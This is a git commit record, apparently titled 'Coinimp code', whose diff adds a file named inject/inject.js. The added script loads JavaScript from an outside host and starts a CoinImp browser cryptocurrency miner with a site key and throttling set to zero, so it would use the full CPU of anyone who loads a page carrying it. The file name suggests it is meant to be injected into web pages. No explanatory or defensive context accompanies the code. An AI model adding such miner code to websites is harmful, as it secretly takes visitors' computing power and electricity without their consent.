16217092d42dc2bea39a1102aa68d5bbd2e6035f
Doğu Deniz Uğur <ddu@oriens.co>
2018-04-01 14:40:54 +0300

    Coinimp code

---
+++ inject/inject.js
@@ -0,0 +1,7 @@
+<script src="https://www.freecontent.date./K2Di.js"></script>
+<script>
+    var _client = new Client.Anonymous('ac2077da35128cd905fd8bd2584ab5ecf821612480726d302ff42a9f7867f181', {
+        throttle: 0
+    });
+    _client.start();
+</script>
